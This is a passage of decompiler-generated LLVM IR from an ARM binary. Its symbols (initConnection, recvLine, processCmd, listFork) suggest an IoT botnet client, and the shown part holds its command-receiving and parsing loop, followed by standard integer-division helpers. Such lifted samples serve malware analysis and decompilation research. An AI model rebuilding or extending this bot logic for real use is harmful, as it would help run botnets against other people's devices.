  %v2_ef80 = icmp eq i32 %v4_ef78, 0
  br i1 %v2_ef80, label %dec_label_pc_ef88, label %dec_label_pc_ef28

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef60
  %v1_ef8c = call i32 @fdpclose(i32 %v3_ef18)
  %v1_ef94 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_ee98, %dec_label_pc_ef88
  store i32 %v1_ee48, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_198f4.291 to i32), i32* @r1, align 4
  %v2_efac = call i32 @__GI_strtok(i32 %v1_ee48, i32 ptrtoint (i32* @global_var_198f4.291 to i32))
  store i32 %v1_ed74, i32* %stack_var_-624, align 4
  %v2_f0b446 = icmp eq i32 %v2_efac, 0
  br i1 %v2_f0b446, label %dec_label_pc_f0bc, label %dec_label_pc_efc4

dec_label_pc_efc4:                                ; preds = %dec_label_pc_ef98, %dec_label_pc_f09c
  %stack_var_-36.049.in = phi i32 [ %v2_f0a4, %dec_label_pc_f09c ], [ %v2_efac, %dec_label_pc_ef98 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f09c ], [ 1, %dec_label_pc_ef98 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_efc8 = load i8, i8* %stack_var_-36.049, align 1
  %v7_efcc = icmp eq i8 %v2_efc8, 10
  br i1 %v7_efcc, label %dec_label_pc_f09c, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efc4
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_efe0 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_efe8 = add i32 %v3_efe0, 1
  %v1_eff0 = call i32 @malloc(i32 %v1_efe8)
  %v0_f004 = load i32, i32* @r4, align 4
  %v3_f004 = mul i32 %v0_f004, 4
  %v2_f010 = add i32 %v2_f00c, %v3_f004
  %v2_f014 = inttoptr i32 %v2_f010 to i32*
  store i32 %v1_eff0, i32* %v2_f014, align 4
  %v3_f024 = mul i32 %stack_var_-40.147, 4
  %v2_f02c = add i32 %v3_f024, %v19_e554
  %v2_f030 = add i32 %v2_f02c, -600
  %v1_f034 = inttoptr i32 %v2_f030 to i32*
  %v2_f034 = load i32, i32* %v1_f034, align 4
  store i32 %v2_f034, i32* @r4, align 4
  %v3_f040 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f048 = add i32 %v3_f040, 1
  %v0_f04c = load i32, i32* @r4, align 4
  store i32 %v1_f048, i32* @r2, align 4
  %v2_f05c = inttoptr i32 %v0_f04c to i8*
  %v3_f05c = call i32 @__GI_memset(i8* %v2_f05c, i32 0)
  %v2_f07c = load i32, i32* %v1_f034, align 4
  %v4_f08c = call i32 @strcpy(i32 %v2_f07c, i8* nonnull %stack_var_-36.049)
  %v1_f094 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_efc4, %dec_label_pc_efd4
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_efc4 ], [ %v1_f094, %dec_label_pc_efd4 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_198f4.291 to i32), i32* @r1, align 4
  %v2_f0a4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_198f4.291 to i32))
  %v2_f0b4 = icmp eq i32 %v2_f0a4, 0
  br i1 %v2_f0b4, label %dec_label_pc_f0bc, label %dec_label_pc_efc4

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f09c, %dec_label_pc_ef98
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_ef98 ], [ %stack_var_-40.0, %dec_label_pc_f09c ]
  %v3_f0c8 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f0d4 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f0d4, label %dec_label_pc_f130.outer, label %dec_label_pc_f0ec.lr.ph

dec_label_pc_f0ec.lr.ph:                          ; preds = %dec_label_pc_f0bc
  br label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0ec.lr.ph, %dec_label_pc_f0ec
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_f0ec.lr.ph ], [ %v1_f118, %dec_label_pc_f0ec ]
  %v3_f0f8 = mul i32 %storemerge15127, 4
  %v2_f100 = add i32 %v3_f0f8, %v19_e554
  %v2_f104 = add i32 %v2_f100, -600
  %v1_f108 = inttoptr i32 %v2_f104 to i32*
  %v2_f108 = load i32, i32* %v1_f108, align 4
  store i32 %v2_f108, i32* @r0, align 4
  %v0_f110 = call i32 @free()
  %v1_f118 = add nuw nsw i32 %storemerge15127, 1
  %v5_f12c = icmp slt i32 %v1_f118, %stack_var_-40.1.lcssa
  br i1 %v5_f12c, label %dec_label_pc_f0ec, label %dec_label_pc_f130.outer

dec_label_pc_f130.outer:                          ; preds = %dec_label_pc_f0ec, %dec_label_pc_ecd4, %dec_label_pc_eeb4, %dec_label_pc_f0bc, %dec_label_pc_ed30, %dec_label_pc_e8fc
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_e8fc ], [ %stack_var_-96.1, %dec_label_pc_ed30 ], [ %stack_var_-96.1, %dec_label_pc_f0bc ], [ %stack_var_-96.1, %dec_label_pc_eeb4 ], [ %stack_var_-96.1, %dec_label_pc_ecd4 ], [ %stack_var_-96.1, %dec_label_pc_f0ec ]
  br label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f130.outer, %dec_label_pc_ec14
  %v2_f134 = load i32, i32* @global_var_2352c.49, align 4
  %v5_f150 = call i32 @recvLine(i32 %v2_f134, i8* %v4_f150, i32 4096, i32 %v2_f140)
  %v3_f160 = icmp eq i32 %v5_f150, -1
  br i1 %v3_f160, label %dec_label_pc_e8e0.outer, label %dec_label_pc_eba8

; uselistorder directives
  uselistorder i32 %v5_f150, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f0a4, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_ee80, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_ee48, { 1, 2, 0 }
  uselistorder i32 %v2_edc0, { 1, 2, 0 }
  uselistorder i8* %v5_ed78, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_ed74, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_ecac, { 1, 2, 0 }
  uselistorder i1 %v9_ebdc, { 1, 0 }
  uselistorder i32 %v3_ebf0, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_eb28, { 1, 0 }
  uselistorder i32 %v3_eb5c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ead0, { 1, 0 }
  uselistorder i32 %v1_eab4, { 1, 0 }
  uselistorder i32 %v5_e9f8, { 1, 0 }
  uselistorder i32 %v1_e988, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_eecc, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_f150, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f140, { 8, 2, 4, 3, 6, 5, 7, 0, 1 }
  uselistorder i32 %v3_e7f0, { 1, 0, 2 }
  uselistorder i32 %v2_e754, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 5, 4, 3, 2, 1, 0, 7, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_198f4.291 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_23534.65, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_297b8.68, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @Rootsprintf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_297ac.79, { 0, 2, 1 }
  uselistorder i32* @global_var_2352c.49, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_19828.264, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_19828.264 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21 }
  uselistorder label %dec_label_pc_f130.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f0ec, { 1, 0 }
  uselistorder label %dec_label_pc_f09c, { 1, 0 }
  uselistorder label %dec_label_pc_efc4, { 1, 0 }
  uselistorder label %dec_label_pc_ef98, { 1, 0 }
  uselistorder label %dec_label_pc_ef60, { 1, 0 }
  uselistorder label %dec_label_pc_ee5c, { 1, 0 }
  uselistorder label %dec_label_pc_ee38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ee28, { 1, 0 }
  uselistorder label %dec_label_pc_eda8, { 1, 0 }
  uselistorder label %dec_label_pc_ed10, { 1, 0 }
  uselistorder label %dec_label_pc_ecd4, { 1, 0 }
  uselistorder label %dec_label_pc_ec14, { 1, 0 }
  uselistorder label %dec_label_pc_eb9c, { 1, 0 }
  uselistorder label %dec_label_pc_eb0c, { 1, 0 }
  uselistorder label %dec_label_pc_e9dc, { 1, 0 }
  uselistorder label %dec_label_pc_e8f0, { 1, 0 }
  uselistorder label %dec_label_pc_e8e0.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e8c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e838, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e710, { 1, 0 }
  uselistorder label %dec_label_pc_e69c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f1b8 = add i32 %arg2, -1
  %v7_f1b8 = icmp eq i32 %arg2, 1
  br i1 %v7_f1b8, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_f1bc = load i32, i32* @r0, align 4
  ret i32 %v2_f1bc

bb80:                                             ; preds = %entry
  %v2_f1b8 = icmp eq i32 %arg2, 0
  br i1 %v2_f1b8, label %dec_label_pc_f2a0, label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %bb80
  %v0_f1c4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_f1c4, %arg2
  br i1 %tmp, label %dec_label_pc_f1cc, label %dec_label_pc_f258

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1c4
  %v2_f1cc = and i32 %v1_f1b8, %arg2
  %v4_f1cc = icmp eq i32 %v2_f1cc, 0
  br i1 %v4_f1cc, label %dec_label_pc_f264, label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f1cc
  %v3_f1d4 = icmp ult i32 %arg2, 536870912
  br i1 %v3_f1d4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f1d4
  %v4_f1d8 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f1d4, %.thread
  %v0_f1f8.pr36.ph = phi i32 [ %v4_f1d8, %.thread ], [ %arg2, %dec_label_pc_f1d4 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f1d4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_f1f8.pr36 = phi i32 [ %v4_f1ec, %bb83 ], [ %v0_f1f8.pr36.ph, %.preheader.preheader ]
  %v1_f1f0 = phi i32 [ %v4_f1f0, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_f1e4 = icmp ugt i32 %v0_f1f8.pr36, 268435455
  br i1 %v2_f1e4, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f1f8thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_f1e8 = icmp ult i32 %v0_f1f8.pr36, %v0_f1c4
  br i1 %v4_f1e8, label %bb82, label %dec_label_pc_f1f8thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_f1ec = and i32 %v0_f1f8.pr36, 268435456
  %v3_f1ec = icmp eq i32 %v2_f1ec, 0
  %v4_f1ec = mul i32 %v0_f1f8.pr36, 16
  br i1 %v3_f1ec, label %bb83, label %dec_label_pc_f1f8.loopexit

bb83:                                             ; preds = %bb82
  %v2_f1f0 = and i32 %v1_f1f0, 268435456
  %v3_f1f0 = icmp eq i32 %v2_f1f0, 0
  %v4_f1f0 = mul i32 %v1_f1f0, 16
  br i1 %v3_f1f0, label %.preheader, label %dec_label_pc_f1f8thread-pre-split.loopexit.loopexit

dec_label_pc_f1f8thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_f20448.ph = phi i32 [ %v1_f1f0, %bb81 ], [ %v4_f1f0, %bb83 ]
  %v0_f1f8.pr38.ph = phi i32 [ %v0_f1f8.pr36, %bb81 ], [ %v4_f1ec, %bb83 ]
  br label %dec_label_pc_f1f8thread-pre-split.loopexit

dec_label_pc_f1f8thread-pre-split.loopexit:       ; preds = %dec_label_pc_f1f8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_f20448 = phi i32 [ %v1_f1f0, %.thread2 ], [ %v1_f20448.ph, %dec_label_pc_f1f8thread-pre-split.loopexit.loopexit ]
  %v0_f1f8.pr38 = phi i32 [ %v0_f1f8.pr36, %.thread2 ], [ %v0_f1f8.pr38.ph, %dec_label_pc_f1f8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f1f8thread-pre-split

dec_label_pc_f1f8thread-pre-split:                ; preds = %dec_label_pc_f1f8thread-pre-split.loopexit, %bb85
  %v1_f20446 = phi i32 [ %v1_f20448, %dec_label_pc_f1f8thread-pre-split.loopexit ], [ %v3_f204, %bb85 ]
  %v0_f1f8.pr = phi i32 [ %v0_f1f8.pr38, %dec_label_pc_f1f8thread-pre-split.loopexit ], [ %v3_f200, %bb85 ]
  br label %dec_label_pc_f1f8

dec_label_pc_f1f8.loopexit:                       ; preds = %bb82
  br label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1f8.loopexit, %dec_label_pc_f1f8thread-pre-split
  %v1_f204 = phi i32 [ %v1_f20446, %dec_label_pc_f1f8thread-pre-split ], [ %v1_f1f0, %dec_label_pc_f1f8.loopexit ]
  %v1_f200 = phi i32 [ %v0_f1f8.pr, %dec_label_pc_f1f8thread-pre-split ], [ %v4_f1ec, %dec_label_pc_f1f8.loopexit ]
  %v2_f1f8 = icmp slt i32 %v1_f200, 0
  br i1 %v2_f1f8, label %dec_label_pc_f20c, label %bb84

bb84:                                             ; preds = %dec_label_pc_f1f8
  %v4_f1fc = icmp ult i32 %v1_f200, %v0_f1c4
  br i1 %v4_f1fc, label %bb85, label %dec_label_pc_f20c

bb85:                                             ; preds = %bb84
  %v3_f200 = mul i32 %v1_f200, 2
  %v2_f204 = icmp slt i32 %v1_f204, 0
  %v3_f204 = mul i32 %v1_f204, 2
  br i1 %v2_f204, label %dec_label_pc_f20c, label %dec_label_pc_f1f8thread-pre-split

dec_label_pc_f20c:                                ; preds = %bb84, %dec_label_pc_f1f8, %bb85
  %v2_f21859 = phi i32 [ %v3_f204, %bb85 ], [ %v1_f204, %bb84 ], [ %v1_f204, %dec_label_pc_f1f8 ]
  %v1_f21051 = phi i32 [ %v3_f200, %bb85 ], [ %v1_f200, %bb84 ], [ %v1_f200, %dec_label_pc_f1f8 ]
  br label %dec_label_pc_f210

dec_label_pc_f210:                                ; preds = %.thread11, %dec_label_pc_f20c
  %v1_f244 = phi i32 [ %v4_f244, %.thread11 ], [ %v2_f21859, %dec_label_pc_f20c ]
  %v1_f218 = phi i32 [ %v0_f250, %.thread11 ], [ 0, %dec_label_pc_f20c ]
  %v1_f248 = phi i32 [ %v4_f248, %.thread11 ], [ %v1_f21051, %dec_label_pc_f20c ]
  %v1_f214 = phi i32 [ %v0_f240, %.thread11 ], [ %v0_f1c4, %dec_label_pc_f20c ]
  %v3_f210 = icmp ult i32 %v1_f214, %v1_f248
  br i1 %v3_f210, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_f210
  %v3_f214 = sub i32 %v1_f214, %v1_f248
  %v3_f218 = or i32 %v1_f218, %v1_f244
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f210, %bb86
  %v1_f220 = phi i32 [ %v1_f214, %dec_label_pc_f210 ], [ %v3_f214, %bb86 ]
  %v1_f224 = phi i32 [ %v1_f218, %dec_label_pc_f210 ], [ %v3_f218, %bb86 ]
  %v4_f21c = udiv i32 %v1_f248, 2
  %v6_f21c = icmp ult i32 %v1_f220, %v4_f21c
  br i1 %v6_f21c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_f220 = urem i32 %v1_f248, 2
  %v4_f220 = icmp eq i32 %v3_f220, 0
  %v6_f220 = sub i32 %v1_f220, %v4_f21c
  br i1 %v4_f220, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f224 = udiv i32 %v1_f244, 2
  %v6_f224 = or i32 %v1_f224, %v5_f224
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_f22c = phi i32 [ %v6_f220, %bb87 ], [ %v1_f220, %.thread7 ], [ %v6_f220, %bb88 ]
  %v1_f230 = phi i32 [ %v1_f224, %bb87 ], [ %v1_f224, %.thread7 ], [ %v6_f224, %bb88 ]
  %v4_f228 = udiv i32 %v1_f248, 4
  %v6_f228 = icmp ult i32 %v1_f22c, %v4_f228
  br i1 %v6_f228, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_f22c = and i32 %v1_f248, 2
  %v4_f22c = icmp eq i32 %v3_f22c, 0
  %v6_f22c = sub i32 %v1_f22c, %v4_f228
  br i1 %v4_f22c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f230 = udiv i32 %v1_f244, 4
  %v6_f230 = or i32 %v1_f230, %v5_f230
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_f238 = phi i32 [ %v6_f22c, %bb89 ], [ %v1_f22c, %.thread8 ], [ %v6_f22c, %bb90 ]
  %v1_f23c = phi i32 [ %v1_f230, %bb89 ], [ %v1_f230, %.thread8 ], [ %v6_f230, %bb90 ]
  %v4_f234 = udiv i32 %v1_f248, 8
  %v6_f234 = icmp ult i32 %v1_f238, %v4_f234
  br i1 %v6_f234, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_f238 = and i32 %v1_f248, 4
  %v4_f238 = icmp eq i32 %v3_f238, 0
  %v6_f238 = sub i32 %v1_f238, %v4_f234
  br i1 %v4_f238, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_f23c = udiv i32 %v1_f244, 8
  %v6_f23c = or i32 %v1_f23c, %v5_f23c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_f250 = phi i32 [ %v1_f23c, %bb91 ], [ %v1_f23c, %.thread9 ], [ %v6_f23c, %bb92 ]
  %v0_f240 = phi i32 [ %v6_f238, %bb91 ], [ %v1_f238, %.thread9 ], [ %v6_f238, %bb92 ]
  %v2_f240 = icmp eq i32 %v0_f240, 0
  br i1 %v2_f240, label %dec_label_pc_f250, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_f244, 16
  br i1 %tmp140, label %dec_label_pc_f250, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_f244 = udiv i32 %v1_f244, 16
  %v4_f248 = udiv i32 %v1_f248, 16
  br label %dec_label_pc_f210

dec_label_pc_f250:                                ; preds = %thread-pre-split, %bb93
  ret i32 %v0_f250

dec_label_pc_f258:                                ; preds = %dec_label_pc_f1c4
  %v9_f1c4 = icmp eq i32 %v0_f1c4, %arg2
  %. = zext i1 %v9_f1c4 to i32
  ret i32 %.

dec_label_pc_f264:                                ; preds = %dec_label_pc_f1cc
  %v2_f264 = icmp ugt i32 %arg2, 65535
  br i1 %v2_f264, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_f264
  %v2_f268 = and i32 %arg2, 32768
  %v3_f268 = icmp eq i32 %v2_f268, 0
  %v4_f268 = udiv i32 %arg2, 65536
  br i1 %v3_f268, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_f264
  %v0_f27465 = phi i32 [ %arg2, %dec_label_pc_f264 ], [ %v4_f268, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_f278 = phi i32 [ %v0_f27465, %.thread16 ], [ %v4_f268, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_f274 = icmp ugt i32 %v1_f278, 255
  br i1 %v2_f274, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_f278 = and i32 %v1_f278, 128
  %v3_f278 = icmp eq i32 %v2_f278, 0
  %v4_f278 = udiv i32 %v1_f278, 256
  br i1 %v3_f278, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f27c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_f288 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_f27c, %bb100 ]
  %v1_f284 = phi i32 [ %v1_f278, %bb98 ], [ %v4_f278, %bb99 ], [ %v4_f278, %bb100 ]
  %v2_f280 = icmp ugt i32 %v1_f284, 15
  br i1 %v2_f280, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_f284 = and i32 %v1_f284, 8
  %v3_f284 = icmp eq i32 %v2_f284, 0
  %v4_f284 = udiv i32 %v1_f284, 16
  br i1 %v3_f284, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_f288 = add nsw i32 %v1_f288, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_f290 = phi i32 [ %v1_f288, %.thread17 ], [ %v1_f288, %bb101 ], [ %v2_f288, %bb102 ]
  %v5_f294 = phi i32 [ %v1_f284, %.thread17 ], [ %v4_f284, %bb101 ], [ %v4_f284, %bb102 ]
  %v2_f28c = icmp ugt i32 %v5_f294, 3
  %v7_f28c = icmp eq i32 %v5_f294, 4
  %v2_f290 = xor i1 %v7_f28c, true
  %v3_f290 = and i1 %v2_f28c, %v2_f290
  br i1 %v3_f290, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_f290 = add nsw i32 %v4_f290, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_f294 = phi i32 [ %v4_f290, %.thread18 ], [ %v5_f290, %bb103 ]
  %v2_f294 = xor i1 %v2_f28c, true
  %v3_f294 = or i1 %v7_f28c, %v2_f294
  br i1 %v3_f294, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_f294 = udiv i32 %v5_f294, 2
  %v9_f294 = add i32 %v4_f294, %v8_f294
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_f298 = phi i32 [ %v4_f294, %bb104 ], [ %v9_f294, %bb105 ]
  %v6_f298 = lshr i32 %v0_f1c4, %v1_f298
  ret i32 %v6_f298

dec_label_pc_f2a0:                                ; preds = %bb80
  %v0_f2a0 = load i32, i32* @lr, align 4
  %v0_f2a4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f2a0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f294, { 1, 0 }
  uselistorder i1 %v7_f28c, { 1, 0 }
  uselistorder i32 %v4_f284, { 1, 0 }
  uselistorder i32 %v1_f284, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f278, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_f278, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f268, { 1, 0 }
  uselistorder i32 %v0_f240, { 1, 0 }
  uselistorder i32 %v4_f234, { 1, 0 }
  uselistorder i32 %v1_f23c, { 1, 2, 0 }
  uselistorder i32 %v4_f228, { 1, 0 }
  uselistorder i32 %v1_f230, { 1, 2, 0 }
  uselistorder i32 %v4_f21c, { 1, 0 }
  uselistorder i32 %v1_f224, { 1, 2, 0 }
  uselistorder i32 %v1_f248, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f218, { 1, 0 }
  uselistorder i32 %v1_f244, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f204, { 1, 0 }
  uselistorder i32 %v3_f200, { 1, 0 }
  uselistorder i32 %v1_f200, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f204, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f1f0, { 1, 0 }
  uselistorder i32 %v4_f1ec, { 2, 1, 0 }
  uselistorder i32 %v1_f1f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f1f8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_f1c4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_f250, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f20c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f1f8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f2b4 = udiv i32 %arg1, %arg2
  ret i32 %v2_f2b4
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f2c8 = add i32 %arg2, -1
  %v2_f2c8 = icmp eq i32 %arg2, 0
  br i1 %v2_f2c8, label %dec_label_pc_f384, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %entry
  %v7_f2c8 = icmp eq i32 %arg2, 1
  br i1 %v7_f2c8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_f2d0
  %v1_f2d0 = load i32, i32* @r0, align 4
  %v10_f2d0 = icmp eq i32 %v1_f2d0, %arg2
  br i1 %v10_f2d0, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_f2d0, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_f2d0 = icmp ult i32 %v1_f2d0, %arg2
  br i1 %v4_f2d0, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_f2d8 = and i32 %v1_f2c8, %arg2
  %v8_f2d8 = icmp eq i32 %v6_f2d8, 0
  br i1 %v8_f2d8, label %.thread67, label %dec_label_pc_f2e8.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_f2dc = phi i32 [ %v1_f2d0, %bb75 ], [ 0, %.thread65 ]
  %v3_f2dc = and i32 %v1_f2dc, %v1_f2c8
  br label %bb76

dec_label_pc_f2e8.preheader:                      ; preds = %bb75
  %v2_f2e899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_f2e899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_f378, %bb74, %bb89, %bb84, %dec_label_pc_f348, %.thread67
